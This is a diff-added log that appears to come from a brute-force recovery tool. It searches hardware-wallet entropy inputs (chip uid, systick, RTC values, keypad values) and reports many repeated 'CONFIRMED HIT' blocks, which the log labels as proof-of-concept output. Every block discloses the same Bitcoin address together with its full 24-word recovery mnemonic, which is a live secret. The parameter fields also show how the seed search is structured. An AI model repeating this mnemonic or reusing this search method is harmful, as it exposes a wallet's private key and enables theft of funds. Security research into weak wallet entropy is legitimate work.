+  address  = bc1qlnmm5z9s7mjcnmjc0jvunklezsxg6lqv92s3lm
+  uid      = 0x0046000e
+  systick  = 52999
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = frog trap craft almost curious repeat describe crunch length aware local collect black other crucial joke firm firm hurry coconut doll jewel fortune coin
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qlnmm5z9s7mjcnmjc0jvunklezsxg6lqv92s3lm
+  uid      = 0x0046000f
+  systick  = 52998
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = frog trap craft almost curious repeat describe crunch length aware local collect black other crucial joke firm firm hurry coconut doll jewel fortune coin
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qlnmm5z9s7mjcnmjc0jvunklezsxg6lqv92s3lm
+  uid      = 0x00460010
+  systick  = 53017
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = frog trap craft almost curious repeat describe crunch length aware local collect black other crucial joke firm firm hurry coconut doll jewel fortune coin
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qlnmm5z9s7mjcnmjc0jvunklezsxg6lqv92s3lm
+  uid      = 0x00460011
+  systick  = 53016
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = frog trap craft almost curious repeat describe crunch length aware local collect black other crucial joke firm firm hurry coconut doll jewel fortune coin
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qlnmm5z9s7mjcnmjc0jvunklezsxg6lqv92s3lm
+  uid      = 0x00460012
+  systick  = 53019
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = frog trap craft almost curious repeat describe crunch length aware local collect black other crucial joke firm firm hurry coconut doll jewel fortune coin
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qlnmm5z9s7mjcnmjc0jvunklezsxg6lqv92s3lm
+  uid      = 0x00460013
+  systick  = 53018
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = frog trap craft almost curious repeat describe crunch length aware local collect black other crucial joke firm firm hurry coconut doll jewel fortune coin
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qlnmm5z9s7mjcnmjc0jvunklezsxg6lqv92s3lm
+  uid      = 0x00460014
+  systick  = 53021
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = frog trap craft almost curious repeat describe crunch length aware local collect black other crucial joke firm firm hurry coconut doll jewel fortune coin
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qlnmm5z9s7mjcnmjc0jvunklezsxg6lqv92s3lm
+  uid      = 0x00460015
+  systick  = 53020
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = frog trap craft almost curious repeat describe crunch length aware local collect black other crucial joke firm firm hurry coconut doll jewel fortune coin
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qlnmm5z9s7mjcnmjc0jvunklezsxg6lqv92s3lm
+  uid      = 0x00460016
+  systick  = 53023
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = frog trap craft almost curious repeat describe crunch length aware local collect black other crucial joke firm firm hurry coconut doll jewel fortune coin
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qlnmm5z9s7mjcnmjc0jvunklezsxg6lqv92s3lm
+  uid      = 0x00460017
+  systick  = 53022
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = frog trap craft almost curious repeat describe crunch length aware local collect black other crucial joke firm firm hurry coconut doll jewel fortune coin
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qlnmm5z9s7mjcnmjc0jvunklezsxg6lqv92s3lm
+  uid      = 0x00460018
+  systick  = 53009
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = frog trap craft almost curious repeat describe crunch length aware local collect black other crucial joke firm firm hurry coconut doll jewel fortune coin
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qlnmm5z9s7mjcnmjc0jvunklezsxg6lqv92s3lm
+  uid      = 0x00460019
+  systick  = 53008
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = frog trap craft almost curious repeat describe crunch length aware local collect black other crucial joke firm firm hurry coconut doll jewel fortune coin
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qlnmm5z9s7mjcnmjc0jvunklezsxg6lqv92s3lm
+  uid      = 0x0046001a
+  systick  = 53011
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = frog trap craft almost curious repeat describe crunch length aware local collect black other crucial joke firm firm hurry coconut doll jewel fortune coin
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qlnmm5z9s7mjcnmjc0jvunklezsxg6lqv92s3lm
+  uid      = 0x0046001b
+  systick  = 53010
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = frog trap craft almost curious repeat describe crunch length aware local collect black other crucial joke firm firm hurry coconut doll jewel fortune coin
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qlnmm5z9s7mjcnmjc0jvunklezsxg6lqv92s3lm
+  uid      = 0x0046001c
+  systick  = 53013
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = frog trap craft almost curious repeat describe crunch length aware local collect black other crucial joke firm firm hurry coconut doll jewel fortune coin
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qlnmm5z9s7mjcnmjc0jvunklezsxg6lqv92s3lm
+  uid      = 0x0046001d
+  systick  = 53012
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = frog trap craft almost curious repeat describe crunch length aware local collect black other crucial joke firm firm hurry coconut doll jewel fortune coin
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qlnmm5z9s7mjcnmjc0jvunklezsxg6lqv92s3lm
+  uid      = 0x0046001e
+  systick  = 53015
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = frog trap craft almost curious repeat describe crunch length aware local collect black other crucial joke firm firm hurry coconut doll jewel fortune coin
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qlnmm5z9s7mjcnmjc0jvunklezsxg6lqv92s3lm
+  uid      = 0x0046001f
+  systick  = 53014
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = frog trap craft almost curious repeat describe crunch length aware local collect black other crucial joke firm firm hurry coconut doll jewel fortune coin
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qlnmm5z9s7mjcnmjc0jvunklezsxg6lqv92s3lm
+  uid      = 0x00460020
+  systick  = 53033
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = frog trap craft almost curious repeat describe crunch length aware local collect black other crucial joke firm firm hurry coconut doll jewel fortune coin
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qlnmm5z9s7mjcnmjc0jvunklezsxg6lqv92s3lm
+  uid      = 0x00460021
+  systick  = 53032
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = frog trap craft almost curious repeat describe crunch length aware local collect black other crucial joke firm firm hurry coconut doll jewel fortune coin
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qlnmm5z9s7mjcnmjc0jvunklezsxg6lqv92s3lm
+  uid      = 0x00460022
+  systick  = 53035
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = frog trap craft almost curious repeat describe crunch length aware local collect black other crucial joke firm firm hurry coconut doll jewel fortune coin
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qlnmm5z9s7mjcnmjc0jvunklezsxg6lqv92s3lm
+  uid      = 0x00460023
+  systick  = 53034
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = frog trap craft almost curious repeat describe crunch length aware local collect black other crucial joke firm firm hurry coconut doll jewel fortune coin
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qlnmm5z9s7mjcnmjc0jvunklezsxg6lqv92s3lm
+  uid      = 0x00460024
+  systick  = 53037
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = frog trap craft almost curious repeat describe crunch length aware local collect black other crucial joke firm firm hurry coconut doll jewel fortune coin
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qlnmm5z9s7mjcnmjc0jvunklezsxg6lqv92s3lm
+  uid      = 0x00460025
+  systick  = 53036
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = frog trap craft almost curious repeat describe crunch length aware local collect black other crucial joke firm firm hurry coconut doll jewel fortune coin
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qlnmm5z9s7mjcnmjc0jvunklezsxg6lqv92s3lm
+  uid      = 0x00460026
+  systick  = 53039
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = frog trap craft almost curious repeat describe crunch length aware local collect black other crucial joke firm firm hurry coconut doll jewel fortune coin
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qlnmm5z9s7mjcnmjc0jvunklezsxg6lqv92s3lm
+  uid      = 0x00460027
+  systick  = 53038
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = frog trap craft almost curious repeat describe crunch length aware local collect black other crucial joke firm firm hurry coconut doll jewel fortune coin
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qlnmm5z9s7mjcnmjc0jvunklezsxg6lqv92s3lm
+  uid      = 0x00460028
+  systick  = 53025
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = frog trap craft almost curious repeat describe crunch length aware local collect black other crucial joke firm firm hurry coconut doll jewel fortune coin
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qlnmm5z9s7mjcnmjc0jvunklezsxg6lqv92s3lm
+  uid      = 0x00460029
+  systick  = 53024
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = frog trap craft almost curious repeat describe crunch length aware local collect black other crucial joke firm firm hurry coconut doll jewel fortune coin
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qlnmm5z9s7mjcnmjc0jvunklezsxg6lqv92s3lm
+  uid      = 0x0046002a
+  systick  = 53027
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = frog trap craft almost curious repeat describe crunch length aware local collect black other crucial joke firm firm hurry coconut doll jewel fortune coin
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qlnmm5z9s7mjcnmjc0jvunklezsxg6lqv92s3lm
+  uid      = 0x0046002b
+  systick  = 53026
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = frog trap craft almost curious repeat describe crunch length aware local collect black other crucial joke firm firm hurry coconut doll jewel fortune coin
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qlnmm5z9s7mjcnmjc0jvunklezsxg6lqv92s3lm
+  uid      = 0x0046002c
+  systick  = 53029
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = frog trap craft almost curious repeat describe crunch length aware local collect black other crucial joke firm firm hurry coconut doll jewel fortune coin
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qlnmm5z9s7mjcnmjc0jvunklezsxg6lqv92s3lm
+  uid      = 0x0046002d
+  systick  = 53028
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = frog trap craft almost curious repeat describe crunch length aware local collect black other crucial joke firm firm hurry coconut doll jewel fortune coin
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qlnmm5z9s7mjcnmjc0jvunklezsxg6lqv92s3lm
+  uid      = 0x0046002e
+  systick  = 53031
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = frog trap craft almost curious repeat describe crunch length aware local collect black other crucial joke firm firm hurry coconut doll jewel fortune coin
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qlnmm5z9s7mjcnmjc0jvunklezsxg6lqv92s3lm
+  uid      = 0x0046002f
+  systick  = 53030
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = frog trap craft almost curious repeat describe crunch length aware local collect black other crucial joke firm firm hurry coconut doll jewel fortune coin
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qlnmm5z9s7mjcnmjc0jvunklezsxg6lqv92s3lm
+  uid      = 0x00460030
+  systick  = 53049
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = frog trap craft almost curious repeat describe crunch length aware local collect black other crucial joke firm firm hurry coconut doll jewel fortune coin
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qlnmm5z9s7mjcnmjc0jvunklezsxg6lqv92s3lm
+  uid      = 0x00460031
+  systick  = 53048
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = frog trap craft almost curious repeat describe crunch length aware local collect black other crucial joke firm firm hurry coconut doll jewel fortune coin
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qlnmm5z9s7mjcnmjc0jvunklezsxg6lqv92s3lm
+  uid      = 0x00460032
+  systick  = 53051
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = frog trap craft almost curious repeat describe crunch length aware local collect black other crucial joke firm firm hurry coconut doll jewel fortune coin
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qlnmm5z9s7mjcnmjc0jvunklezsxg6lqv92s3lm
+  uid      = 0x00460033
+  systick  = 53050
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = frog trap craft almost curious repeat describe crunch length aware local collect black other crucial joke firm firm hurry coconut doll jewel fortune coin
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qlnmm5z9s7mjcnmjc0jvunklezsxg6lqv92s3lm
+  uid      = 0x00460034
+  systick  = 53053
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = frog trap craft almost curious repeat describe crunch length aware local collect black other crucial joke firm firm hurry coconut doll jewel fortune coin
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qlnmm5z9s7mjcnmjc0jvunklezsxg6lqv92s3lm
+  uid      = 0x00460035
+  systick  = 53052
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = frog trap craft almost curious repeat describe crunch length aware local collect black other crucial joke firm firm hurry coconut doll jewel fortune coin
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qlnmm5z9s7mjcnmjc0jvunklezsxg6lqv92s3lm
+  uid      = 0x00460036
+  systick  = 53055
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = frog trap craft almost curious repeat describe crunch length aware local collect black other crucial joke firm firm hurry coconut doll jewel fortune coin
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qlnmm5z9s7mjcnmjc0jvunklezsxg6lqv92s3lm
+  uid      = 0x00460037
+  systick  = 53054
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = frog trap craft almost curious repeat describe crunch length aware local collect black other crucial joke firm firm hurry coconut doll jewel fortune coin
+  PoC appended -> poc_hits.txt
+[75.94%] 501.60M/660.56M @ 44.20K/s  ETA 1.00h
+
+*** CONFIRMED HIT ***
+  address  = bc1qlnmm5z9s7mjcnmjc0jvunklezsxg6lqv92s3lm
+  uid      = 0x00460038
+  systick  = 53041
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = frog trap craft almost curious repeat describe crunch length aware local collect black other crucial joke firm firm hurry coconut doll jewel fortune coin
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qlnmm5z9s7mjcnmjc0jvunklezsxg6lqv92s3lm
+  uid      = 0x00460039
+  systick  = 53040
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = frog trap craft almost curious repeat describe crunch length aware local collect black other crucial joke firm firm hurry coconut doll jewel fortune coin
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qlnmm5z9s7mjcnmjc0jvunklezsxg6lqv92s3lm
+  uid      = 0x0046003a
+  systick  = 53043
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = frog trap craft almost curious repeat describe crunch length aware local collect black other crucial joke firm firm hurry coconut doll jewel fortune coin
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qlnmm5z9s7mjcnmjc0jvunklezsxg6lqv92s3lm
+  uid      = 0x0046003b
+  systick  = 53042
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = frog trap craft almost curious repeat describe crunch length aware local collect black other crucial joke firm firm hurry coconut doll jewel fortune coin
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qlnmm5z9s7mjcnmjc0jvunklezsxg6lqv92s3lm
+  uid      = 0x0046003c
+  systick  = 53045
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = frog trap craft almost curious repeat describe crunch length aware local collect black other crucial joke firm firm hurry coconut doll jewel fortune coin
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qlnmm5z9s7mjcnmjc0jvunklezsxg6lqv92s3lm
+  uid      = 0x0046003d
+  systick  = 53044
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = frog trap craft almost curious repeat describe crunch length aware local collect black other crucial joke firm firm hurry coconut doll jewel fortune coin
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qlnmm5z9s7mjcnmjc0jvunklezsxg6lqv92s3lm
+  uid      = 0x0046003e
+  systick  = 53047
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = frog trap craft almost curious repeat describe crunch length aware local collect black other crucial joke firm firm hurry coconut doll jewel fortune coin
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qlnmm5z9s7mjcnmjc0jvunklezsxg6lqv92s3lm
+  uid      = 0x0046003f
+  systick  = 53046
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = frog trap craft almost curious repeat describe crunch length aware local collect black other crucial joke firm firm hurry coconut doll jewel fortune coin
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qlnmm5z9s7mjcnmjc0jvunklezsxg6lqv92s3lm
+  uid      = 0x00460040
+  systick  = 53065
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = frog trap craft almost curious repeat describe crunch length aware local collect black other crucial joke firm firm hurry coconut doll jewel fortune coin
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qlnmm5z9s7mjcnmjc0jvunklezsxg6lqv92s3lm
+  uid      = 0x00460041
+  systick  = 53064
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = frog trap craft almost curious repeat describe crunch length aware local collect black other crucial joke firm firm hurry coconut doll jewel fortune coin
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qlnmm5z9s7mjcnmjc0jvunklezsxg6lqv92s3lm
+  uid      = 0x00460042
+  systick  = 53067
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = frog trap craft almost curious repeat describe crunch length aware local collect black other crucial joke firm firm hurry coconut doll jewel fortune coin
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qlnmm5z9s7mjcnmjc0jvunklezsxg6lqv92s3lm
+  uid      = 0x00460043
+  systick  = 53066
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = frog trap craft almost curious repeat describe crunch length aware local collect black other crucial joke firm firm hurry coconut doll jewel fortune coin
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qlnmm5z9s7mjcnmjc0jvunklezsxg6lqv92s3lm
+  uid      = 0x00460044
+  systick  = 53069
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = frog trap craft almost curious repeat describe crunch length aware local collect black other crucial joke firm firm hurry coconut doll jewel fortune coin
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qlnmm5z9s7mjcnmjc0jvunklezsxg6lqv92s3lm
+  uid      = 0x00460045
+  systick  = 53068
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = frog trap craft almost curious repeat describe crunch length aware local collect black other crucial joke firm firm hurry coconut doll jewel fortune coin
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qlnmm5z9s7mjcnmjc0jvunklezsxg6lqv92s3lm
+  uid      = 0x00460046
+  systick  = 53071
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = frog trap craft almost curious repeat describe crunch length aware local collect black other crucial joke firm firm hurry coconut doll jewel fortune coin
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qlnmm5z9s7mjcnmjc0jvunklezsxg6lqv92s3lm
+  uid      = 0x00460047
+  systick  = 53070
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = frog trap craft almost curious repeat describe crunch length aware local collect black other crucial joke firm firm hurry coconut doll jewel fortune coin
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qlnmm5z9s7mjcnmjc0jvunklezsxg6lqv92s3lm
+  uid      = 0x00460048
+  systick  = 53057
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = frog trap craft almost curious repeat describe crunch length aware local collect black other crucial joke firm firm hurry coconut doll jewel fortune coin
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qlnmm5z9s7mjcnmjc0jvunklezsxg6lqv92s3lm
+  uid      = 0x00460049
+  systick  = 53056
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = frog trap craft almost curious repeat describe crunch length aware local collect black other crucial joke firm firm hurry coconut doll jewel fortune coin
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qlnmm5z9s7mjcnmjc0jvunklezsxg6lqv92s3lm
+  uid      = 0x00460050
+  systick  = 53081
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = frog trap craft almost curious repeat describe crunch length aware local collect black other crucial joke firm firm hurry coconut doll jewel fortune coin
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qlnmm5z9s7mjcnmjc0jvunklezsxg6lqv92s3lm
+  uid      = 0x00460051
+  systick  = 53080
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = frog trap craft almost curious repeat describe crunch length aware local collect black other crucial joke firm firm hurry coconut doll jewel fortune coin
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qlnmm5z9s7mjcnmjc0jvunklezsxg6lqv92s3lm
+  uid      = 0x00460052
+  systick  = 53083
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = frog trap craft almost curious repeat describe crunch length aware local collect black other crucial joke firm firm hurry coconut doll jewel fortune coin
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qlnmm5z9s7mjcnmjc0jvunklezsxg6lqv92s3lm
+  uid      = 0x00460053
+  systick  = 53082
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = frog trap craft almost curious repeat describe crunch length aware local collect black other crucial joke firm firm hurry coconut doll jewel fortune coin
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qlnmm5z9s7mjcnmjc0jvunklezsxg6lqv92s3lm
+  uid      = 0x00460054
+  systick  = 53085
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = frog trap craft almost curious repeat describe crunch length aware local collect black other crucial joke firm firm hurry coconut doll jewel fortune coin
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qlnmm5z9s7mjcnmjc0jvunklezsxg6lqv92s3lm
+  uid      = 0x00460055
+  systick  = 53084
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = frog trap craft almost curious repeat describe crunch length aware local collect black other crucial joke firm firm hurry coconut doll jewel fortune coin
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qlnmm5z9s7mjcnmjc0jvunklezsxg6lqv92s3lm
+  uid      = 0x00460056
+  systick  = 53087
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = frog trap craft almost curious repeat describe crunch length aware local collect black other crucial joke firm firm hurry coconut doll jewel fortune coin
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qlnmm5z9s7mjcnmjc0jvunklezsxg6lqv92s3lm
+  uid      = 0x00460057
+  systick  = 53086
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = frog trap craft almost curious repeat describe crunch length aware local collect black other crucial joke firm firm hurry coconut doll jewel fortune coin
+  PoC appended -> poc_hits.txt
+
+*** CONFIRMED HIT ***
+  address  = bc1qlnmm5z9s7mjcnmjc0jvunklezsxg6lqv92s3lm
+  uid      = 0x00460058
+  systick  = 53073
+  rtc_tr   = 0x000000
+  rtc_ssr  = 0
+  kpad_a   = 2
+  kpad_b   = 24
+  mnemonic = frog trap craft almost curious repeat describe crunch length aware local collect black other crucial joke firm firm hurry coconut doll jewel fortune coin
